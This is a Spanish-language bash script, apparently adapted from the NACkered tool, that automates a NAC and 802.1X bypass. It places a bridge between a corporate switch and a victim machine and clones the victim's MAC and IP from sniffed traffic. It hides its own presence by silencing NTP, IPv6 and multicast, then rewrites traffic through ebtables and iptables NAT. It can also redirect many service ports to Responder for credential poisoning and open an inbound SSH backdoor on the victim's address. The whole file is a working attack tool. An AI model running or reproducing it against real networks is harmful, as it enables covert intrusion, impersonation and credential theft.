#!/bin/bash

###############################################################################
# Nombre: nac_bypass_setup.sh
# Descripción: Automatiza la configuración de un dispositivo en modo puente
#              para suplantar a un cliente legítimo y evadir controles NAC.
# Uso: ./nac_bypass_setup.sh [-1 <if_switch>] [-2 <if_cliente>] [-acgRiSrS]
# Dependencias: bash, bridge-utils, iproute2, ethtool, macchanger, arptables,
#               ebtables, iptables, tcpdump, systemd (systemctl)
# Basado en: NACkered v2.92.2 de Matt E (KPMG LLP, 2014)
###############################################################################

# --- Variables de configuración --------------------------------------------
VERSION="0.6.5-1715949302"

CMD_TABLAS_ARP=/usr/sbin/arptables
CMD_TABLAS_EB=/usr/sbin/ebtables
CMD_TABLAS_IP=/usr/sbin/iptables

# Paleta de colores para mensajes legibles en terminal.
COLOR_REINICIO="\e[0m" # restablecer texto
COLOR_EXITO="\e[1;32m" # verde
COLOR_INFO="\e[1;34m" # azul
COLOR_ALERTA="\e[1;31m" # rojo
COLOR_INDICACION="\e[1;36m" # cian

INTERFAZ_PUENTE=br0 # interfaz del puente
INTERFAZ_CONMUTADOR=eth0 # interfaz de red conectada al conmutador
MAC_CONMUTADOR=00:11:22:33:44:55 # valor inicial, se establece durante la inicialización
INTERFAZ_CLIENTE=eth1 # interfaz de red conectada a la máquina víctima

IP_PUENTE=169.254.66.66 # dirección IP para el puente
PUERTA_ENLACE_PUENTE=169.254.66.1 # dirección IP de la puerta de enlace del puente

ARCHIVO_CAPTURA=/tmp/tcpdump.pcap
OPCION_RESPONDER=0        # Activa la redirección de puertos para Responder
OPCION_SSH=0              # Habilita redirección y arranque de OpenSSH
OPCION_AUTONOMA=0         # Suprime interacción manual y mensajes extra
OPCION_SOLO_CONEXION=0    # Ejecuta únicamente la segunda fase del bypass
OPCION_SOLO_INICIAL=0     # Ejecuta únicamente la fase inicial
OPCION_REINICIO=0         # Restablece el entorno y sale

# Puertos de interés analizados durante la captura inicial.
PUERTO_TCPDUMP_1=88
PUERTO_TCPDUMP_2=445

# Puertos que Responder suele necesitar para envenenamiento y autenticación.
PUERTO_UDP_NETBIOS_NS=137
PUERTO_UDP_NETBIOS_DS=138
PUERTO_UDP_DNS=53
PUERTO_UDP_LDAP=389
PUERTO_TCP_LDAP=389
PUERTO_TCP_SQL=1433
PUERTO_UDP_SQL=1434
PUERTO_TCP_HTTP=80
PUERTO_TCP_HTTPS=443
PUERTO_TCP_SMB=445
PUERTO_TCP_NETBIOS_SS=139
PUERTO_TCP_FTP=21
PUERTO_TCP_SMTP1=25
PUERTO_TCP_SMTP2=587
PUERTO_TCP_POP3=110
PUERTO_TCP_IMAP=143
PUERTO_TCP_PROXY=3128
PUERTO_UDP_MULTIDIFUSION=5553

PUERTO_RETORNO_SSH=50222 # puerto de retorno SSH usa victimip:50022 para conectar attackerbox:sshport
PUERTO_SSH=50022
RANGO_PUERTOS_NAT=61000-62000 # puertos para mi tráfico en el NAT

# --- Funciones de utilidad --------------------------------------------------
mostrar_ayuda() {
  echo -e "$0 v$VERSION uso:"
  echo "    -1 <eth>    interfaz de red conectada al conmutador"
  echo "    -2 <eth>    interfaz de red conectada a la máquina víctima"
  echo "    -a          modo autónomo"
  echo "    -c          iniciar solo la configuración de conexión"
  echo "    -g <MAC>    establecer manualmente la dirección MAC de la puerta de enlace (MAC_PUERTA_ENLACE)"
  echo "    -h          muestra esta ayuda"
  echo "    -i          iniciar solo la configuración inicial"
  echo "    -r          restablecer todos los ajustes"
  echo "    -R          habilitar redirección de puertos para Responder"
  echo "    -S          habilitar redirección de puertos para OpenSSH e iniciar el servicio"
  exit 0
}

## mostrar información de versión
mostrar_version() {
  echo -e "$0 v$VERSION"
  exit 0
}

# Analiza los parámetros recibidos y ajusta las banderas de ejecución.
analizar_argumentos() {
  while getopts ":1:2:acg:hirRS" option; do
    case "$option" in
      1)
        INTERFAZ_CONMUTADOR=$OPTARG
        ;;
      2)
        INTERFAZ_CLIENTE=$OPTARG
        ;;
      a)
        OPCION_AUTONOMA=1
        ;;
      c)
        OPCION_SOLO_CONEXION=1
        ;;
      g)
        MAC_PUERTA_ENLACE=$OPTARG
        ;;
      h)
        mostrar_ayuda
        ;;
      i)
        OPCION_SOLO_INICIAL=1
        ;;
      r)
        OPCION_REINICIO=1
        ;;
      R)
        OPCION_RESPONDER=1
        ;;
      S)
        OPCION_SSH=1
        ;;
      *)
        OPCION_RESPONDER=0
        OPCION_SSH=0
        OPCION_AUTONOMA=0
        ;;
    esac
  done
}

# --- Fase 1: Preparar la infraestructura de puente -------------------------
fase_inicial() {
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] ¡Comenzando el bypass NAC! Mantente atento...$COLOR_REINICIO"
    echo
  fi

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Realizando tareas preparatorias$COLOR_REINICIO"
    echo
  fi

  systemctl stop NetworkManager.service
  cp /etc/sysctl.conf /etc/sysctl.conf.bak
  echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
  sysctl -p
  echo "" > /etc/resolv.conf

  # Desactivar multidifusión en ambas interfaces para que la red no reciba IGMP iniciales.
  ip link set "$INTERFAZ_CONMUTADOR" multicast off
  ip link set "$INTERFAZ_CLIENTE" multicast off

  # Pausar servicios NTP habituales; cualquier sincronización automática puede delatar la presencia.
  declare -a SERVICIOS_NTP=("ntp.service" "ntpsec.service" "chronyd.service" "systemd-timesyncd.service")
  for SERVICIO in "${SERVICIOS_NTP[@]}"; do
    ESTADO_SERVICIO=$(systemctl is-active "$SERVICIO")
    if [[ $ESTADO_SERVICIO == "active" ]]; then
      systemctl stop "$SERVICIO"
    fi
  done
  timedatectl set-ntp false

  # Obtener automáticamente la dirección MAC física del puerto hacia el conmutador.
  MAC_CONMUTADOR=$(ifconfig "$INTERFAZ_CONMUTADOR" | grep -i ether | awk '{ print $2 }')

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_EXITO [ + ] Trabajo preparatorio terminado.$COLOR_REINICIO"
    echo
  fi

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Iniciando la configuración del puente$COLOR_REINICIO"
    echo
  fi

  brctl addbr "$INTERFAZ_PUENTE"                              # crear puente virtual
  brctl addif "$INTERFAZ_PUENTE" "$INTERFAZ_CLIENTE"          # añadir interfaz del cliente
  brctl addif "$INTERFAZ_PUENTE" "$INTERFAZ_CONMUTADOR"          # añadir interfaz hacia el conmutador

  echo 8 > "/sys/class/net/${INTERFAZ_PUENTE}/bridge/group_fwd_mask"            # reenviar tramas EAP para 802.1X
  echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables

  ifconfig "$INTERFAZ_CLIENTE" 0.0.0.0 up promisc              # levantar interfaz del cliente en modo promiscuo
  ifconfig "$INTERFAZ_CONMUTADOR" 0.0.0.0 up promisc              # levantar interfaz del conmutador en modo promiscuo

  macchanger -m 00:12:34:56:78:90 "$INTERFAZ_PUENTE"          # valor inicial neutro
  macchanger -m "$MAC_CONMUTADOR" "$INTERFAZ_PUENTE"              # suplantar la MAC del lado del conmutador

  ifconfig "$INTERFAZ_PUENTE" 0.0.0.0 up promisc

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_EXITO [ + ] Puente levantado, debería permanecer silencioso.$COLOR_REINICIO"
    echo
    echo -e "$COLOR_INDICACION [ # ] Conecta los cables Ethernet respetando la topología: $INTERFAZ_CONMUTADOR → switch corporativo, $INTERFAZ_CLIENTE → cliente legítimo. Verifica enlace y actividad en los LEDs.$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Deja estabilizar la negociación de enlace durante ~30 segundos y, cuando lo confirmes, pulsa cualquier tecla para continuar.$COLOR_REINICIO"
    echo -e "$COLOR_ALERTA [ ! ] La máquina víctima debería funcionar en este punto; si no, se avecinan malos tiempos, ¡corre!$COLOR_REINICIO"
    echo -e "$COLOR_INFO [ * ] Monitorizando tramas EAPOL en $INTERFAZ_CLIENTE para verificar la autenticación...$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Pulsa cualquier tecla para detener la monitorización y continuar con el flujo.$COLOR_REINICIO"

    local PID_MONITOREO_EAPOL=""
    local TCPDUMP_MONITOREO_ARGS=(-i "$INTERFAZ_CLIENTE" -l -nn -e -vvv -s0 -tttt ether proto 0x888e)
    trap '[[ -n "$PID_MONITOREO_EAPOL" ]] && kill -INT "$PID_MONITOREO_EAPOL" 2>/dev/null' INT TERM
    tcpdump "${TCPDUMP_MONITOREO_ARGS[@]}" &
    PID_MONITOREO_EAPOL=$!

    read -r -s -n1
    echo
    if kill -0 "$PID_MONITOREO_EAPOL" 2>/dev/null; then
      kill -INT "$PID_MONITOREO_EAPOL" 2>/dev/null
      wait "$PID_MONITOREO_EAPOL" 2>/dev/null
    fi
    trap - INT TERM
  else
    sleep 25s
  fi
}

# --- Fase 2: Clonar identidad ----------------------
fase_conexion() {
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Restableciendo la conexión en $INTERFAZ_CLIENTE y $INTERFAZ_CONMUTADOR$COLOR_REINICIO"
    echo -e "$COLOR_INFO [ * ] Reinicializando enlaces para forzar renegociación y mantener modo promiscuo$COLOR_REINICIO"
    echo
  fi

  for IFACE in "$INTERFAZ_CLIENTE" "$INTERFAZ_CONMUTADOR"; do
    if ip link set "$IFACE" down 2>/dev/null; then
      [[ "$OPCION_AUTONOMA" -eq 0 ]] && echo -e "$COLOR_INDICACION [ # ] $IFACE bajada correctamente$COLOR_REINICIO"
    else
      [[ "$OPCION_AUTONOMA" -eq 0 ]] && echo -e "$COLOR_ALERTA [ ! ] No se pudo bajar $IFACE$COLOR_REINICIO"
    fi
  done

  sleep 1

  for IFACE in "$INTERFAZ_CLIENTE" "$INTERFAZ_CONMUTADOR"; do
    if ip link set "$IFACE" up 2>/dev/null; then
      ip link set "$IFACE" promisc on 2>/dev/null
      local ESTADO_IFACE
      ESTADO_IFACE=$(cat "/sys/class/net/${IFACE}/operstate" 2>/dev/null)
      [[ "$OPCION_AUTONOMA" -eq 0 ]] && echo -e "$COLOR_EXITO [ + ] $IFACE arriba (estado: ${ESTADO_IFACE:-desconocido})$COLOR_REINICIO"
    else
      [[ "$OPCION_AUTONOMA" -eq 0 ]] && echo -e "$COLOR_ALERTA [ ! ] No se pudo levantar $IFACE$COLOR_REINICIO"
    fi
  done

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
  fi

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Escuchando tráfico TCP...$COLOR_REINICIO"
    echo
  fi

  ## Capturar PCAP y buscar paquetes SYN provenientes de la máquina víctima para obtener la IP de origen, la MAC de origen y la MAC de la puerta de enlace
  # TODO: ¿Reemplazar esto con tcp SYN O (udp && no broadcast? hay que distinguir origen y destino)
  # TODO: ¿Sustituirlo obteniendo los datos directamente de la interfaz de origen?
  tcpdump -i "$INTERFAZ_CLIENTE" -s0 -w "$ARCHIVO_CAPTURA" -c1 'tcp[13] & 2 != 0'

  MAC_CLIENTE=$(tcpdump -r "$ARCHIVO_CAPTURA" -nne -c 1 tcp | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}')
  if [[ -z "$MAC_PUERTA_ENLACE" ]]; then
    MAC_PUERTA_ENLACE=$(tcpdump -r "$ARCHIVO_CAPTURA" -nne -c 1 tcp | awk '{print $2","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $2}')
  fi
  IP_CLIENTE=$(tcpdump -r "$ARCHIVO_CAPTURA" -nne -c 1 tcp | awk '{print $3","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $3}')

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Procesando el paquete y definiendo variables $COLOR_REINICIO"
    echo -e "$COLOR_INFO [ * ] Info: MAC_CLIENTE: $MAC_CLIENTE, MAC_PUERTA_ENLACE: $MAC_PUERTA_ENLACE, IP_CLIENTE: $IP_CLIENTE $COLOR_REINICIO"
    echo
  fi

  ## entrar en silencio
  $CMD_TABLAS_ARP -A OUTPUT -o "$INTERFAZ_CONMUTADOR" -j DROP
  $CMD_TABLAS_ARP -A OUTPUT -o "$INTERFAZ_CLIENTE" -j DROP
  $CMD_TABLAS_IP -A OUTPUT -o "$INTERFAZ_CLIENTE" -j DROP
  $CMD_TABLAS_IP -A OUTPUT -o "$INTERFAZ_CONMUTADOR" -j DROP

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Activando la interfaz con la IP del lado del puente, configurando la reescritura de Capa 2 y la ruta predeterminada. $COLOR_REINICIO"
    echo
  fi
  ifconfig "$INTERFAZ_PUENTE" "$IP_PUENTE" up promisc

  ## configurar reescritura de Capa 2
  ## Si el script se llamó con -c, necesitamos encontrar la MAC de la interfaz hacia el conmutador.
  if [[ "$OPCION_SOLO_CONEXION" -eq 1 ]]; then
    MAC_CONMUTADOR=$(ifconfig "$INTERFAZ_CONMUTADOR" | grep -i ether | awk '{ print $2 }')
  fi
  $CMD_TABLAS_EB -t nat -A POSTROUTING -s "$MAC_CONMUTADOR" -o "$INTERFAZ_CONMUTADOR" -j snat --to-src "$MAC_CLIENTE"
  $CMD_TABLAS_EB -t nat -A POSTROUTING -s "$MAC_CONMUTADOR" -o "$INTERFAZ_PUENTE" -j snat --to-src "$MAC_CLIENTE"

  ## crear rutas predeterminadas para encaminar el tráfico: todo el tráfico va a la puerta de enlace del puente y se envía en Capa 2 a MAC_PUERTA_ENLACE
  arp -s -i "$INTERFAZ_PUENTE" "$PUERTA_ENLACE_PUENTE" "$MAC_PUERTA_ENLACE"
  route add default gw "$PUERTA_ENLACE_PUENTE" dev "$INTERFAZ_PUENTE" metric 10

  ## RETORNO SSH: si recibimos tráfico entrante en el puente para VICTIMIP:DPORT reenviar a IP_PUENTE por SSH
  if [[ "$OPCION_SSH" -eq 1 ]]; then

    if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
      echo
      echo -e "$COLOR_INFO [ * ] Configurando shell inversa SSH entrante en $IP_CLIENTE:$PUERTO_RETORNO_SSH e iniciando el demonio OpenSSH $COLOR_REINICIO"
      echo
    fi
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_RETORNO_SSH" -j DNAT --to "$IP_PUENTE:$PUERTO_SSH"
  fi

  if [[ "$OPCION_RESPONDER" -eq 1 ]]; then

    if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
      echo
      echo -e "$COLOR_INFO [ * ] Configurando todos los puertos entrantes para Responder $COLOR_REINICIO"
      echo
    fi

    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p udp --dport "$PUERTO_UDP_NETBIOS_NS" -j DNAT --to "$IP_PUENTE:$PUERTO_UDP_NETBIOS_NS"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p udp --dport "$PUERTO_UDP_NETBIOS_DS" -j DNAT --to "$IP_PUENTE:$PUERTO_UDP_NETBIOS_DS"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p udp --dport "$PUERTO_UDP_DNS" -j DNAT --to "$IP_PUENTE:$PUERTO_UDP_DNS"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p udp --dport "$PUERTO_UDP_LDAP" -j DNAT --to "$IP_PUENTE:$PUERTO_UDP_LDAP"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_TCP_LDAP" -j DNAT --to "$IP_PUENTE:$PUERTO_TCP_LDAP"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_TCP_SQL" -j DNAT --to "$IP_PUENTE:$PUERTO_TCP_SQL"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p udp --dport "$PUERTO_UDP_SQL" -j DNAT --to "$IP_PUENTE:$PUERTO_UDP_SQL"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_TCP_HTTP" -j DNAT --to "$IP_PUENTE:$PUERTO_TCP_HTTP"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_TCP_HTTPS" -j DNAT --to "$IP_PUENTE:$PUERTO_TCP_HTTPS"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_TCP_SMB" -j DNAT --to "$IP_PUENTE:$PUERTO_TCP_SMB"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_TCP_NETBIOS_SS" -j DNAT --to "$IP_PUENTE:$PUERTO_TCP_NETBIOS_SS"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_TCP_FTP" -j DNAT --to "$IP_PUENTE:$PUERTO_TCP_FTP"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_TCP_SMTP1" -j DNAT --to "$IP_PUENTE:$PUERTO_TCP_SMTP1"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_TCP_SMTP2" -j DNAT --to "$IP_PUENTE:$PUERTO_TCP_SMTP2"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_TCP_POP3" -j DNAT --to "$IP_PUENTE:$PUERTO_TCP_POP3"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_TCP_IMAP" -j DNAT --to "$IP_PUENTE:$PUERTO_TCP_IMAP"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p tcp --dport "$PUERTO_TCP_PROXY" -j DNAT --to "$IP_PUENTE:$PUERTO_TCP_PROXY"
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" -p udp --dport "$PUERTO_UDP_MULTIDIFUSION" -j DNAT --to "$IP_PUENTE:$PUERTO_UDP_MULTIDIFUSION"
  fi

  # Configurar reglas de reescritura de Capa 3
  # Cualquier protocolo que salga del SO por INTERFAZ_PUENTE con IP_PUENTE lo reescribimos a IP_CLIENTE y le asignamos un puerto del rango para NAT
  $CMD_TABLAS_IP -t nat -A POSTROUTING -o "$INTERFAZ_PUENTE" -s "$IP_PUENTE" -p tcp -j SNAT --to "$IP_CLIENTE:$RANGO_PUERTOS_NAT"
  $CMD_TABLAS_IP -t nat -A POSTROUTING -o "$INTERFAZ_PUENTE" -s "$IP_PUENTE" -p udp -j SNAT --to "$IP_CLIENTE:$RANGO_PUERTOS_NAT"
  $CMD_TABLAS_IP -t nat -A POSTROUTING -o "$INTERFAZ_PUENTE" -s "$IP_PUENTE" -p icmp -j SNAT --to "$IP_CLIENTE"

  ## INICIAR SSH
  if [[ "$OPCION_SSH" -eq 1 ]]; then
    systemctl start ssh.service
  fi

  ## Finalizar
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_EXITO [ + ] Todos los pasos de configuración completados; verifica que los puertos sigan activos y operativos $COLOR_REINICIO"
    echo
  fi

  ## Restablecer el flujo de tráfico; supervisar puertos por bloqueo
  $CMD_TABLAS_ARP -D OUTPUT -o "$INTERFAZ_CONMUTADOR" -j DROP
  $CMD_TABLAS_ARP -D OUTPUT -o "$INTERFAZ_CLIENTE" -j DROP
  $CMD_TABLAS_IP -D OUTPUT -o "$INTERFAZ_CLIENTE" -j DROP
  $CMD_TABLAS_IP -D OUTPUT -o "$INTERFAZ_CONMUTADOR" -j DROP

  ## Limpieza
  rm "$ARCHIVO_CAPTURA"

  ## Listo
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INDICACION [ * ] Hora de divertirse y sacar provecho $COLOR_REINICIO"
    echo
  fi
}

# --- Rutina de limpieza completa -------------------------------------------
restablecer_configuracion() {
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Restableciendo todos los ajustes $COLOR_REINICIO"
    echo
  fi

  ## derribar el puente
  ifconfig "$INTERFAZ_PUENTE" down
  brctl delbr "$INTERFAZ_PUENTE"

  ## eliminar ruta predeterminada
  arp -d -i "$INTERFAZ_PUENTE" "$PUERTA_ENLACE_PUENTE" "$MAC_PUERTA_ENLACE"
  route del default dev "$INTERFAZ_PUENTE"

  # Vaciar EB, ARP e IPTABLES
  $CMD_TABLAS_EB -F
  $CMD_TABLAS_EB -F -t nat
  $CMD_TABLAS_ARP -F
  $CMD_TABLAS_IP -F
  $CMD_TABLAS_IP -F -t nat

  # Restaurar sysctl.conf
  cp /etc/sysctl.conf.bak /etc/sysctl.conf
  rm /etc/sysctl.conf.bak
  sysctl -p

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_EXITO [ + ] Todos los pasos de restablecimiento han finalizado. $COLOR_REINICIO"
    echo
  fi
}

# --- Punto de entrada ------------------------------------------------------
analizar_argumentos "$@"

if [[ "$OPCION_REINICIO" -eq 1 ]]; then
  restablecer_configuracion
  exit 0
fi

if [[ "$OPCION_SOLO_INICIAL" -eq 1 ]]; then
  fase_inicial
  exit 0
fi

if [[ "$OPCION_SOLO_CONEXION" -eq 1 ]]; then
  fase_conexion
  exit 0
fi

fase_inicial
fase_conexion
